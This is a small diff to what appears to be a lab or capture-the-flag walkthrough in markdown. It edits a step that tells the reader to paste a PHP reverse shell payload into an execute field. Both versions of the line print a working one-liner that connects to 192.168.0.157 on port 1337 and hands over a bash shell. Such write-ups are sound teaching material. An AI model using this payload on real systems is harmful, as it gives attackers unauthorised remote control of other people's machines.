@@ -57,7 +57,10 @@ We can upload our PHP reverse shell file, Get one from https://www.revshells.com
 
 ![](https://i.imgur.com/iS3YC7v.png)
 
-Now paste in your reverse shell payload, i will be using `php -r '$sock=fsockopen("192.168.0.157",1337);exec("/bin/bash <&3 >&3 2>&3");'`  for my payload, after pasting these you should get a connection on your terminal
+Now paste in your reverse shell payload on the execute bar, i will be using `php -r '$sock=fsockopen("192.168.0.157",1337);exec("/bin/bash <&3 >&3 2>&3");'` for my payload, after pasting these you should get a connection on your terminal
+
+![](https://i.imgur.com/xG9ZJFD.png)
+
 
 
 
